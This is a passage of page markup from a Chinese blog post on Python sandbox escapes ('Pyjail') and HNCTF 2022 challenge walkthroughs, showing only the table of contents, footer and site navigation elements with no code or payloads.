class="nav-link" href="#%E7%BB%95%E8%BF%87-2"><span class="nav-text">&#39;&#39;绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#str-%E5%87%BD%E6%95%B0"><span class="nav-text">str 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#chr-%E5%87%BD%E6%95%B0"><span class="nav-text">chr 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#list-dict"><span class="nav-text">list + dict</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#doc"><span class="nav-text">_doc_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#bytes-%E5%87%BD%E6%95%B0"><span class="nav-text">bytes 函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-3"><span class="nav-text">+绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">数字绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-text">运算符绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-4"><span class="nav-text">()绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">内建函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%92%8C-%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-text">.和 ，获取获取函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unicode-%E7%BB%95%E8%BF%87"><span class="nav-text">unicode 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="nav-text">绕过命名空间限制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E9%99%90%E5%88%B6"><span class="nav-text">部分限制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%8C%E5%85%A8%E9%99%90%E5%88%B6-no-builtins"><span class="nav-text">完全限制(no builtins)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6"><span class="nav-text">绕过多行限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%99%90%E5%88%B6%E4%B8%8D%E8%83%BD%E5%87%BA%E7%8E%B0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%EF%BC%8C%E6%9E%84%E9%80%A0%E7%9A%84%E7%9B%AE%E6%A0%87%E6%98%AF%E8%B0%83%E7%94%A8-open-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E8%AF%BB%E5%8F%96"><span class="nav-text">题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-stdin-read"><span class="nav-text">sys.stdin.read()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-text">breakpoint 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-text">help 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%A0%E5%8A%A0"><span class="nav-text">字符串叠加</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AF%A1%E6%94%B9"><span class="nav-text">变量覆盖与函数篡改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-gc-%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="nav-text">利用 gc 获取已删除模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-audit-hook"><span class="nav-text">绕过 audit hook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#posixsubprocess-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">_posixsubprocess 执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E5%87%BD%E6%95%B0"><span class="nav-text">篡改函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E4%B8%8D%E8%A7%A6%E5%8F%91-hook-%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">其他不触发 hook 的方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1"><span class="nav-text">绕过 AST 沙箱</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#without-call"><span class="nav-text">without call</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%A6%86%E7%9B%96"><span class="nav-text">函数覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#metaclass-%E5%88%A9%E7%94%A8%EF%BC%88%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E6%89%A7%E8%A1%8C%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%91%A2-%EF%BC%89"><span class="nav-text">metaclass 利用（如何在不执行构造函数的情况下获取类实例呢?）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exceptions-%E5%88%A9%E7%94%A8"><span class="nav-text">exceptions 利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-license-%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-text">通过 license 函数读取文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F-no-builitins-%E7%8E%AF%E5%A2%83"><span class="nav-text">模拟 no builitins 环境</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HNCTF-2022-Pyjail%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="nav-text">HNCTF 2022 Pyjail题目复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner"><span class="nav-text">calc_jail_beginner</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level1"><span class="nav-text">calc_jail_beginner_level1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level2"><span class="nav-text">calc_jail_beginner_level2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level3"><span class="nav-text">calc_jail_beginner_level3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level2-5"><span class="nav-text">calc_jail_beginner_level2.5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python2-input"><span class="nav-text">python2 input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lake-lake-lake"><span class="nav-text">lake lake lake</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#l-ke-l-ke-l-ke"><span class="nav-text">l@ke l@ke l@ke</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level5"><span class="nav-text">calc_jail_beginner_level5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#laKe-laKe-laKe"><span class="nav-text">laKe laKe laKe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-byte-command"><span class="nav-text">4 byte command</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level5-1"><span class="nav-text">calc_jail_beginner_level5.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lak3-lak3-lak3"><span class="nav-text">lak3 lak3 lak3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tyPe-Ch-nnEl"><span class="nav-text">tyPe Ch@nnEl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4"><span class="nav-text">calc_jail_beginner_level4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-0-5"><span class="nav-text">calc_jail_beginner_level4.0.5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-1"><span class="nav-text">calc_jail_beginner_level4.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-2"><span class="nav-text">calc_jail_beginner_level4.2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level4-3"><span class="nav-text">calc_jail_beginner_level4.3</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2025
        
            &nbsp;</i>&nbsp;&nbsp;<a href="/">C3ngH</a>
        
    </div>

    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">总字数</span>
                    <span class="item-value border-box word">83.4k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">访客数</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">访问量</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPyjail"><span class="nav-text">什么是Pyjail</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyjail%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="nav-text">Pyjail的实现原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">Python魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Pyjail%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">Pyjail中常用的魔术方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pyjail%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0%E5%92%8C%E6%A8%A1%E5%9D%97"><span class="nav-text">Pyjail中常用的函数和模块</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#import-%E5%87%BD%E6%95%B0"><span class="nav-text">import 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exec-eval-%E5%87%BD%E6%95%B0"><span class="nav-text">exec &amp; eval 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#execfile-%E5%87%BD%E6%95%B0"><span class="nav-text">execfile 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#timeit-%E5%87%BD%E6%95%B0-from-timeit-%E6%A8%A1%E5%9D%97"><span class="nav-text">timeit 函数 from timeit 模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97"><span class="nav-text">platform 模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#commands-%E6%A8%A1%E5%9D%97"><span class="nav-text">commands 模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#subprocess%E6%A8%A1%E5%9D%97"><span class="nav-text">subprocess模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#compile-%E5%87%BD%E6%95%B0"><span class="nav-text">compile 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fstring%EF%BC%88f%E4%BF%AE%E9%A5%B0%E7%AC%A6-py-3-6%EF%BC%89"><span class="nav-text">fstring（f修饰符 py&gt;3.6）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#file-%E5%87%BD%E6%95%B0"><span class="nav-text">file 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#open-%E5%87%BD%E6%95%B0"><span class="nav-text">open 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#codecs%E6%A8%A1%E5%9D%97"><span class="nav-text">codecs模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Filetype-%E5%87%BD%E6%95%B0-from-types-%E6%A8%A1%E5%9D%97"><span class="nav-text">Filetype 函数 from types 模块</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E5%8A%A0%E6%B7%B1%E5%85%A5%E7%9A%84%E7%90%86%E8%A7%A3Python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">更加深入的理解Python魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyjail%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">Pyjail绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0decode"><span class="nav-text">内联函数decode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins%E5%87%BD%E6%95%B0"><span class="nav-text">builtins函数 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E5%BC%95%E5%85%A5os%E7%AD%89%E6%A8%A1%E5%9D%97"><span class="nav-text">路径引入os等模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reload%E6%A8%A1%E5%9D%97"><span class="nav-text">reload模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%90%8D%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%AB%E6%8F%8F%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87-%E9%80%9A%E8%BF%87getattr-%E6%9D%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C"><span class="nav-text">函数名字符串扫描过滤的绕过(通过getattr()来字符串操作)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D-sys-modules"><span class="nav-text">恢复 sys.modules</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E7%BB%A7%E6%89%BF%E9%93%BE%E8%8E%B7%E5%8F%96%EF%BC%88object%E7%B1%BB%EF%BC%89"><span class="nav-text">基于继承链获取（object类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="nav-text">字符串拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64-%E5%8F%98%E5%BD%A2"><span class="nav-text">base64 变形</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%86%E5%BA%8F"><span class="nav-text">逆序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B1%9E%E6%80%A7%E5%90%8D%E6%88%96%E8%80%85%E5%87%BD%E6%95%B0%E5%90%8D%EF%BC%9A"><span class="nav-text">过滤了属性名或者函数名：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattr-%E5%87%BD%E6%95%B0"><span class="nav-text">getattr 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattribute-%E5%87%BD%E6%95%B0"><span class="nav-text">__getattribute__ 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#globals-%E6%9B%BF%E6%8D%A2"><span class="nav-text">_globals_ 替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-import"><span class="nav-text">过滤 import</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#loader-load-module"><span class="nav-text">__loader__.load_module</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">[]绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-getitem-%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E6%9B%BF%E6%8D%A2%EF%BC%9B"><span class="nav-text">调用__getitem__()函数直接替换；</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getitem-%E6%9B%BF%E6%8D%A2%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="nav-text">getitem()替换中括号[]</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pop-%E6%9B%BF%E6%8D%A2%E4%B8%AD%E6%8B%AC%E5%8F%B7-%EF%BC%8C%E7%BB%93%E5%90%88-getitem-%E5%88%A9%E7%94%A8"><span class="nav-text">pop()替换中括号[]，结合__getitem__()利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-2"><span class="nav-text">&#39;&#39;绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#str-%E5%87%BD%E6%95%B0"><span class="nav-text">str 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#chr-%E5%87%BD%E6%95%B0"><span class="nav-text">chr 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#list-dict"><span class="nav-text">list + dict</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#doc"><span class="nav-text">_doc_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#bytes-%E5%87%BD%E6%95%B0"><span class="nav-text">bytes 函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-3"><span class="nav-text">+绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">数字绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-text">运算符绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-4"><span class="nav-text">()绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">内建函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%92%8C-%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-text">.和 ，获取获取函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unicode-%E7%BB%95%E8%BF%87"><span class="nav-text">unicode 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="nav-text">绕过命名空间限制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E9%99%90%E5%88%B6"><span class="nav-text">部分限制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%8C%E5%85%A8%E9%99%90%E5%88%B6-no-builtins"><span class="nav-text">完全限制(no builtins)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6"><span class="nav-text">绕过多行限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%99%90%E5%88%B6%E4%B8%8D%E8%83%BD%E5%87%BA%E7%8E%B0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%EF%BC%8C%E6%9E%84%E9%80%A0%E7%9A%84%E7%9B%AE%E6%A0%87%E6%98%AF%E8%B0%83%E7%94%A8-open-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E8%AF%BB%E5%8F%96"><span class="nav-text">题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-stdin-read"><span class="nav-text">sys.stdin.read()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-text">breakpoint 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-text">help 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%A0%E5%8A%A0"><span class="nav-text">字符串叠加</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AF%A1%E6%94%B9"><span class="nav-text">变量覆盖与函数篡改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-gc-%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="nav-text">利用 gc 获取已删除模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-audit-hook"><span class="nav-text">绕过 audit hook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#posixsubprocess-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">_posixsubprocess 执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E5%87%BD%E6%95%B0"><span class="nav-text">篡改函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E4%B8%8D%E8%A7%A6%E5%8F%91-hook-%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">其他不触发 hook 的方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1"><span class="nav-text">绕过 AST 沙箱</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#without-call"><span class="nav-text">without call</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%A6%86%E7%9B%96"><span class="nav-text">函数覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#metaclass-%E5%88%A9%E7%94%A8%EF%BC%88%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E6%89%A7%E8%A1%8C%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%91%A2-%EF%BC%89"><span class="nav-text">metaclass 利用（如何在不执行构造函数的情况下获取类实例呢?）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exceptions-%E5%88%A9%E7%94%A8"><span class="nav-text">exceptions 利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-license-%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-text">通过 license 函数读取文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F-no-builitins-%E7%8E%AF%E5%A2%83"><span class="nav-text">模拟 no builitins 环境</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HNCTF-2022-Pyjail%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="nav-text">HNCTF 2022 Pyjail题目复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner"><span class="nav-text">calc_jail_beginner</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level1"><span class="nav-text">calc_jail_beginner_level1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level2"><span class="nav-text">calc_jail_beginner_level2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level3"><span class="nav-text">calc_jail_beginner_level3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level2-5"><span class="nav-text">calc_jail_beginner_level2.5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python2-input"><span class="nav-text">python2 input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lake-lake-lake"><span class="nav-text">lake lake lake</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#l-ke-l-ke-l-ke"><span class="nav-text">l@ke l@ke l@ke</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level5"><span class="nav-text">calc_jail_beginner_level5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#laKe-laKe-laKe"><span class="nav-text">laKe laKe laKe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-byte-command"><span class="nav-text">4 byte command</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-jail-beginner-level5-1"><span class="nav-text">calc_jail_beginner_level5.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lak3-lak3-lak3"><span class="nav-text">lak3 lak3 lak3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 